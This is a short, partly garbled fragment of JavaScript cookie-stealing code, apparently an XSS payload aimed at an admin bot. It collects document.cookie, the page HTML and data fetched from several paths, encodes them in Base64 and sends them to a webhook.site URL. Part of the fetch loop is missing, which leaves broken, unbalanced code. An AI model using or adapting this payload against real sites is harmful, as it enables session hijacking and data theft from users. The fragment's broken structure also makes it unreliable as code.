        // YOUR WEBHOOK URL
        const myWebhook = "https://webhook.site/ed2ef1cd-e216-4528-a098-9168b8fe5b00";

        async function exfiltrate() {
            let dataLeak = {};

            // 1. Try to grab the Bot's Cookies
            dataLeak.cookies = document.cookie || "No cookies accessible";

            // 2. Try to grab the content of the current page (where the bot is)
            dataLeak.current_html = document.body.innerHTML;

                    dataLeak[`path_${path.replace(/\//g, '_')}`] = text;
                } catch (e) {
                    dataLeak[`path_${path}`] = "Failed to fetch";

            // We use Base64 encoding (btoa) so special characters don't break the URL
            const encodedData = btoa(JSON.stringify(dataLeak));
            fetch(`${myWebhook}?vault=${encodedData}`, { mode: 'no-cors' });
